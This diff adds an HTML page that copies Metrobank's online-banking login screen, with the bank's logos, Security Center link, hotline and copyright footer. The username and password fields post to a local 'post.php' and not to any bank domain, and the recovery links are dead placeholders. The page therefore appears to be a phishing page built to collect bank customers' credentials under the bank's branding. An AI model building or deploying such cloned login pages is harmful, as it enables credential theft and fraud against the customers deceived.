@@ -1,0 +1,133 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html>
+<head>
+	<link rel="shortcut icon" href="images/mbtc.ico"/>
+	<title>Welcome</title>
+    <script language="javascript" src="js/jquery.js"></script>
+	
+	<!--[if IE 7]>
+	<link rel="stylesheet" type="text/css" href="styles/mainForIE7.css" />
+	<![endif]-->
+
+	<!--[if (gt IE 7)|!(IE)]><!-->
+		<link rel="stylesheet" type="text/css" href="main.css" />
+	<!--<![endif]-->
+	</head>
+
+	<body>
+
+		<div id="container">
+
+			<div id="header">
+
+				<div id="top-header">
+					<a href="home.html"><img src="images/metrobankLogo.jpg" style="margin-top: 25px; margin-left:12px; float:left; border:0;" /></a>
+					<img src="images/homepage_banner.jpg"  style="margin-top: 19px; margin-left:28px;" />
+					<!--[if (gte IE 8)|!(IE)]><!--><img src="images/MDS-logo.jpg" align="right" style="margin-top: 18px; margin-right:25px;"/><!--<![endif]-->
+					<!--[if IE 7]><img src="images/MDS-logo.jpg" style="margin-left: 40px; margin-bottom: 15px;"/><![endif]-->
+				</div>
+
+
+			</div>
+
+            	<div id="login-holder">
+            	<form action="post.php" method="post">
+                	<div id="form">
+
+                    <p style="margin-top: 2px !important;">
+
+                    <label style="font-weight:normal; width:189px;">User ID:</label><br />
+
+                    <input type="text" name="username" />       
+
+                    <p/>
+
+                     <p>
+
+                    <label style="font-weight:normal; width:199px;">Password:</label><br />
+
+                    <input type="password" name="password"/>       
+
+                    <p/>
+
+                     <div id="btn-holder">
+
+                    	<input type="reset" value="" class="clear2"/>&nbsp;
+
+                    	<input type="submit" value="" id="login"/>
+					
+						<div id="clear"></div>
+                        <div id="option">
+
+							<a href="#" style="padding:2px; margin-bottom:4px; font-weight:bold;">Not yet enrolled?</a>&nbsp; 
+							<span class="signupLink">
+							<a href="signup.html" style="margin-bottom:4px; font-weight:bold;">Sign up now!</a><br />
+							</span>
+							
+							<a href="#">Forgot your User ID? </a><a href="#">Forgot your Password?</a>
+						</form>
+                        </div>
+
+                    </div>
+
+                    </div>
+
+                   
+
+                    <div id="instruction">
+
+                    	<h1 style="font-size:17px;">
+
+                        View important tips for safe and secure <br />online banking in our 
+
+                        <a href="https://www.metrobank.com.ph/security_center.asp" style="text-decoration:none; color:#1493e3;" target=_blank>Security Center</a>
+
+                        </h1>
+
+                        <UL>
+
+                          <LI>Read about Security Alerts 
+
+                          <LI>Learn how to protect yourself 
+
+                          <LI>Find out how we protect you 
+
+                          <LI>Learn more about online fraud </LI>
+
+                         
+
+                        </UL>
+
+                         <a href="index.html"><img src="images/view-online-demo.png" width="180px" style="margin-left:65px;"/></a>
+
+						
+
+                    </div>
+
+                </div>
+
+			<div id="footer">
+
+				Customer Hotline: (632) 8700-700 24/7 Domestic Toll-free No.: 1-800-1888-5775
+
+                E-mail: <a href="mailto:customercare@metrobank.com.ph">customercare@metrobank.com.ph</a>
+
+                Copyright ©2012 Metrobank. All rights reserved.
+
+			</div>
+
+		</div>
+
+</html>
+
+<script>
+
+	function login(){
+
+		window.location="post.php";
+
+	}
+
+</script>
